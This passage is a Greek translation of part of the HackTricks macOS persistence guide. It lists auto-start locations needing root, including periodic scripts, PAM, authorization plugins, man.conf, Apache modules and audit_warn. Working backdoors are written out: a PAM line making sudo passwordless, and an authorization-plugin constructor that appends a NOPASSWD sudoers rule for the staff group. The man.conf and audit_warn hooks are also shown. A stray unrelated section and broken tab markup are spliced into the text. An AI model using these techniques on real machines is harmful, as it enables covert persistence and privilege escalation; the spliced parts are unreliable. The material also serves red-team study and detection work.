Για να δημιουργήσετε το δικό σας εισαγωγέα, μπορείτε να ξεκινήσετε με αυτό το έργο: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) και στη συνέχεια να αλλάξετε το όνομα, το **`CFBundleDocumentTypes`** και να προσθέσετε **`UTImportedTypeDeclarations`** ώστε να υποστηρίζει την επέκταση που θέλετε και να τα αντικατοπτρίζετε στο **`schema.xml`**.\
Στη συνέχεια **αλλάξτε** τον κώδικα της συνάρτησης **`GetMetadataForFile`** για να εκτελεί το payload σας όταν δημιουργείται ένα αρχείο με την επεξεργασμένη επέκταση.

Τέλος **κάντε build και αντιγράψτε τον νέο σας `.mdimporter`** σε μία από τις προηγούμενες τοποθεσίες και μπορείτε να ελέγξετε όταν φορτώνεται **παρακολουθώντας τα logs** ή ελέγχοντας το **`mdimport -L.`**

### ~~Πίνακας Προτιμήσεων~~

{% hint style="danger" %}
Δεν φαίνεται ότι λειτουργεί πλέον.
{% endhint %}

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Χρήσιμο για παράκαμψη αμμοθονίου: [🟠](https://emojipedia.org/large-orange-circle)
* Χρειάζεται συγκεκριμένη ενέργεια χρήστη
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Περιγραφή

Δεν φαίνεται ότι λειτουργεί πλέον.

## Παράκαμψη Αμμοθονίου Root

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για παράκαμψη αμμοθονίου που σάς επιτρέπουν να απλά εκτελέσετε κάτι γράφοντάς το σε ένα αρχείο ως χρήστης root και/ή απαιτώντας άλλες περίεργες συνθήκες.
{% endhint %}

### Περιοδικός

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Χρήσιμο για παράκαμψη αμμοθονίου: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε δικαιώματα root
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Απαιτούνται δικαιώματα root
* **Ενεργοποίηση**: Όταν έρθει η ώρα
* `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`
* Απαιτούνται δικαιώματα root
* **Ενεργοποίηση**: Όταν έρθει η ώρα

#### Περιγραφή & Εκμετάλλευση

Τα περιοδικά scripts (**`/etc/periodic`**) εκτελούνται λόγω των **launch daemons** που έχουν διαμορφωθεί στο `/System/Library/LaunchDaemons/com.apple.periodic*`. Σημειώστε ότι τα scripts που αποθηκεύονται στο `/etc/periodic/` εκτελούνται ως ο ιδιοκτήτης του αρχείου, οπότε αυτό δεν θα λειτουργήσει για πιθανή ανόδο ικανοτήτων. {% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Υπάρχουν και άλλα περιοδικά scripts που θα εκτελεστούν όπως υποδεικνύεται στο **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Εάν καταφέρετε να γράψετε οποιοδήποτε από τα αρχεία `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local` θα **εκτελεστεί νωρίτερα ή αργότερα**.

{% hint style="warning" %}
Σημειώστε ότι το περιοδικό script θα **εκτελεστεί ως ο ιδιοκτήτης του script**. Έτσι, εάν ένας κανονικός χρήστης είναι ιδιοκτήτης του script, θα εκτελεστεί ως αυτός ο χρήστης (κάτι που μπορεί να αποτρέψει επιθέσεις εξάρτησης από προνομιακά δικαιώματα).
{% endhint %}

### PAM

Ανάλυση: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Χρήσιμο για παράκαμψη αμμουδιάς: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε root
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* Πάντα απαιτείται root

#### Περιγραφή & Εκμετάλλευση

Καθώς το PAM είναι περισσότερο εστιασμένο στη **μόνιμη διατήρηση** και το malware παρά στην εύκολη εκτέλεση μέσα στο macOS, αυτό το blog δεν θα δώσει μια λεπτομερή εξήγηση, **διαβάστε τις αναλύσεις για να κατανοήσετε καλύτερα αυτή την τεχνική**.

Ελέγξτε τα modules PAM με:
```bash
ls -l /etc/pam.d
```
Μια τεχνική διατήρησης/ανόδου προνομίων που καταχράζεται το PAM είναι τόσο εύκολη όσο η τροποποίηση του module /etc/pam.d/sudo προσθέτοντας στην αρχή τη γραμμή:
```bash
auth       sufficient     pam_permit.so
```
Έτσι θα **μοιάζει** κάτι τέτοιο:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Και επομένως οποιαδήποτε προσπάθεια χρήσης **`sudo` θα λειτουργήσει**.

{% hint style="danger" %}
Σημειώστε ότι αυτός ο κατάλογος προστατεύεται από το TCC, επομένως είναι πολύ πιθανό να ζητηθεί από τον χρήστη άδεια πρόσβασης.
{% endhint %}

### Πρόσθετα Εξουσιοδότησης

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Ανάλυση: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε δικαιώματα ρίζας και επιπλέον ρυθμίσεις
* Παράκαμψη TCC: ???

#### Τοποθεσία

* `/Library/Security/SecurityAgentPlugins/`
* Απαιτείται ρίζα
* Απαιτείται επίσης να διαμορφώσετε τη βάση δεδομένων εξουσιοδότησης για να χρησιμοποιήσει το πρόσθετο

#### Περιγραφή & Εκμετάλλευση

Μπορείτε να δημιουργήσετε ένα πρόσθετο εξουσιοδότησης που θα εκτελείται όταν ένας χρήστης συνδέεται για να διατηρήσετε την επιμονή. Για περισσότερες πληροφορίες σχετικά με το πώς να δημιουργήσετε ένα από αυτά τα πρόσθετα, ελέγξτε τις προηγούμενες αναλύσεις (και προσέξτε, ένα κακά γραμμένο μπορεί να σας κλειδώσει έξω και θα χρειαστεί να καθαρίσετε το Mac σας από τη λειτουργία ανάκτησης).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Μετακινήστε** το δέμα στη θέση που θα φορτωθεί:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Τέλος, προσθέστε τον **κανόνα** για τη φόρτωση αυτού του Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Το **`evaluate-mechanisms`** θα ειδοποιήσει το πλαίσιο εξουσιοδότησης ότι θα χρειαστεί να **καλέσει ένα εξωτερικό μηχανισμό για εξουσιοδότηση**. Επιπλέον, το **`privileged`** θα κάνει την εκτέλεσή του από τον ριζικό χρήστη.

Ενεργοποίησέ το με:
```bash
security authorize com.asdf.asdf
```
Και στη συνέχεια η **ομάδα προσωπικού πρέπει να έχει πρόσβαση sudo** (διαβάστε το `/etc/sudoers` για επιβεβαίωση).

### Man.conf

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Χρήσιμο για παράκαμψη αμμουδιάς: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά πρέπει να είστε ριζοχρήστης και ο χρήστης πρέπει να χρησιμοποιεί το man
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`/private/etc/man.conf`**
* Απαιτείται ρίζα
* **`/private/etc/man.conf`**: Κάθε φορά που χρησιμοποιείται το man

#### Περιγραφή & Εκμετάλλευση

Το αρχείο ρύθμισης **`/private/etc/man.conf`** υποδεικνύει το δυαδικό/σενάριο που θα χρησιμοποιηθεί όταν ανοίγονται αρχεία τεκμηρίωσης man. Έτσι, το μονοπάτι προς το εκτελέσιμο μπορεί να τροποποιηθεί έτσι ώστε κάθε φορά που ο χρήστης χρησιμοποιεί το man για να διαβάσει κάποια έγγραφα, να εκτελείται ένα backdoor.

Για παράδειγμα, ορίστε στο **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Και στη συνέχεια δημιουργήστε το `/tmp/view` ως:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Χρήσιμο για παράκαμψη αμμοθονίου: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε δικαιώματα ρίζας και ο Apache πρέπει να εκτελείται
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
* Το Httpd δεν έχει δικαιώματα

#### Τοποθεσία

* **`/etc/apache2/httpd.conf`**
* Απαιτείται ρίζα
* Ενεργοποίηση: Όταν ξεκινά ο Apache2

#### Περιγραφή & Εκμετάλλευση

Μπορείτε να υποδείξετε στο `/etc/apache2/httpd.conf` να φορτώσει ένα module προσθέτοντας μια γραμμή όπως:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Με αυτόν τον τρόπο, τα μεταγλωττισμένα σας modules θα φορτωθούν από τον Apache. Το μόνο που χρειάζεται είναι είτε να το **υπογράψετε με ένα έγκυρο πιστοποιητικό της Apple**, είτε να **προσθέσετε ένα νέο αξιόπιστο πιστοποιητικό** στο σύστημα και να το **υπογράψετε** με αυτό.

Στη συνέχεια, αν χρειαστεί, για να εξασφαλίσετε ότι ο διακομιστής θα ξεκινήσει, μπορείτε να εκτελέσετε:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Παράδειγμα κώδικα για το Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Πλαίσιο ελέγχου BSM

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε δικαιώματα ρίζας, το auditd να εκτελείται και να προκαλεί μια προειδοποίηση
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`/etc/security/audit_warn`**
* Απαιτούνται δικαιώματα ρίζας
* **Ενεργοποίηση**: Όταν το auditd ανιχνεύει μια προειδοποίηση

#### Περιγραφή & Εκμετάλλευση

Κάθε φορά που το auditd ανιχνεύει μια προειδοποίηση, το σενάριο **`/etc/security/audit_warn`** **εκτελείται**. Έτσι μπορείτε να προσθέσετε το φορτίο σας σε αυτό.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Στοιχεία Εκκίνησης

{% hint style="danger" %}
**Αυτό έχει αποσυρθεί, οπότε δεν πρέπει να βρεθεί τίποτα σε αυτούς τους καταλόγους.**
{% endhint %}

Το **StartupItem** είναι ένας κατάλογος που πρέπει να τοποθετηθεί είτε στο `/Library/StartupItems/` είτε στο `/System/Library/StartupItems/`. Μόλις αυτός ο κατάλογος δημιουργηθεί, πρέπει να περιλαμβάνει δύο συγκεκριμένα αρχεία:

1. Ένα **rc script**: Ένα shell script που εκτελείται κατά την εκκίνηση.
2. Ένα αρχείο **plist**, με το συγκεκριμένο όνομα `StartupParameters.plist`, το οποίο περιέχει διάφορες ρυθμίσεις διαμόρφωσης.

Βεβαιωθείτε ότι τόσο το rc script όσο και το αρχείο `StartupParameters.plist` είναι τοποθετημένα σωστά μέσα στον κατάλογο **StartupItem** για να τα αναγνωρίσει και να τα χρησιμοποιήσει η διαδικασία εκκίνησης.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

### Τοποθεσίες Αυτόματης Έναρξης στο macOS

Στο macOS, υπάρχουν διάφορες τοποθεσίες όπου μπορούν να προστεθούν εφαρμογές για να ξεκινούν αυτόματα κατά την εκκίνηση του συστήματος. Αυτές οι τοποθεσίες περιλαμβάνουν:

1. **Φάκελος Εκκίνησης (Startup Folder):** Οι εφαρμογές που βρίσκονται σε αυτόν τον φάκελο θα ξεκινήσουν αυτόματα με την εκκίνηση του συστήματος για τον συγκεκριμένο χρήστη.

2. **Launch Agents και Launch Daemons:** Τα αρχεία που βρίσκονται στα φακέλους `/Library/LaunchAgents`, `/Library/LaunchDaemons`, `~/Library/LaunchAgents` ή `/System/Library/LaunchAgents` μπορούν να χρησιμοποιηθούν για να δημιουργήσουν αυτόματες εκκινήσεις.

3. **Ρυθμίσεις Χρήστη:** Οι ρυθμίσεις στο Μενού Συστήματος > Χρήστες και Ομάδες > Στοιχεία Σύνδεσης μπορούν να περιέχουν εφαρμογές που ξεκινούν αυτόματα.

Ελέγξτε αυτές τις τοποθεσίες για να διαχειριστείτε τις εφαρμογές που ξεκινούν αυτόματα στο macOS και να ενισχύσετε την ασφάλεια του συστήματός σας. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Δεν μπορώ να βρω αυτό το στοιχείο στο macOS μου, οπότε για περισσότερες πληροφορίες ελέγξτε το writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Εισήχθη από την Apple, το **emond** είναι ένα μηχανισμός καταγραφής που φαίνεται να είναι ανεπτυγμένος ελάχιστα ή ίσως εγκαταλειμμένος, αλλά παραμένει προσβάσιμος. Αν και δεν είναι ιδιαίτερα χρήσιμος για έναν διαχειριστή Mac, αυτή η σκοτεινή υπηρεσία θα μπορούσε να λειτουργήσει ως ένας διακριτικός τρόπος διατήρησης για απειλητικούς παράγοντες, πιθανώς απαρατήρητος από τους περισσότερους διαχειριστές macOS.

Για όσους γνωρίζουν την ύπαρξή του, η ανίχνευση οποιασδήποτε κακόβουλης χρήσης του **emond** είναι απλή. Το LaunchDaemon του συστήματος για αυτήν την υπηρεσία αναζητά scripts για εκτέλεση σε έναν μόνο κατάλογο. Για να ελεγχθεί αυτό, μπορεί να χρησιμοποιηθεί η ακόλουθη εντολή:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Τοποθεσία

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Απαιτείται ρίζα
* **Ενεργοποίηση**: Με το XQuartz

#### Περιγραφή & Εκμετάλλευση

Το XQuartz **δεν εγκαθίσταται πλέον στο macOS**, οπότε αν θέλετε περισσότερες πληροφορίες, ελέγξτε το writeup.

### ~~kext~~

{% hint style="danger" %}
Είναι τόσο περίπλοκο να εγκαταστήσετε ένα kext ακόμα και ως ρίζα, ώστε δεν θα το θεωρήσω ως τρόπο απόδρασης από τις αμμοθύες ή ακόμα και για διατήρηση (εκτός αν έχετε ένα εκμετάλλευση)
{% endhint %}

#### Τοποθεσία

Για να εγκαταστήσετε ένα KEXT ως στοιχείο εκκίνησης, πρέπει να είναι **εγκατεστημένο σε μία από τις ακόλουθες τοποθεσίες**:

* `/System/Library/Extensions`
* Αρχεία KEXT που έχουν ενσωματωθεί στο λειτουργικό σύστημα OS X.
* `/Library/Extensions`
* Αρχεία KEXT που έχουν εγκατασταθεί από λογισμικό τρίτων

Μπορείτε να εμφανίσετε τα φορτωμένα αρχεία kext με:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Για περισσότερες πληροφορίες σχετικά με τις [**επεκτάσεις πυρήνα ελέγξτε αυτή την ενότητα**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Τοποθεσία

* **`/usr/local/bin/amstoold`**
* Απαιτεί δικαιώματα ρίζας

#### Περιγραφή & Εκμετάλλευση

Φαίνεται ότι το `plist` από το `/System/Library/LaunchAgents/com.apple.amstoold.plist` χρησιμοποιούσε αυτό το δυαδικό ενώ εκθέτοντας ένα XPC service... το πρόβλημα είναι ότι το δυαδικό δεν υπήρχε, οπότε θα μπορούσατε να τοποθετήσετε κάτι εκεί και όταν κληθεί το XPC service, το δικό σας δυαδικό θα κληθεί.

Δεν μπορώ πλέον να βρω αυτό στο macOS μου.

### ~~xsanctl~~

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Τοποθεσία

* **`/Library/Preferences/Xsan/.xsanrc`**
* Απαιτεί δικαιώματα ρίζας
* **Ενεργοποίηση**: Όταν το σέρβις τρέχει (σπάνια)

#### Περιγραφή & εκμετάλλευση

Φαίνεται ότι δεν είναι πολύ συνηθισμένο να τρέξει αυτό το script και ακόμη δεν μπόρεσα να το βρω στο macOS μου, οπότε αν θέλετε περισσότερες πληροφορίες ελέγξτε το ανάλυση.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Αυτό δεν λειτουργεί σε μοντέρνες εκδόσεις MacOS**
{% endhint %}

Είναι επίσης δυνατόν να τοποθετήσετε εδώ **εντολές που θα εκτελούνται κατά την εκκίνηση.** Παράδειγμα κανονικού script rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Τεχνικές και εργαλεία διατήρησης

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.

</details>
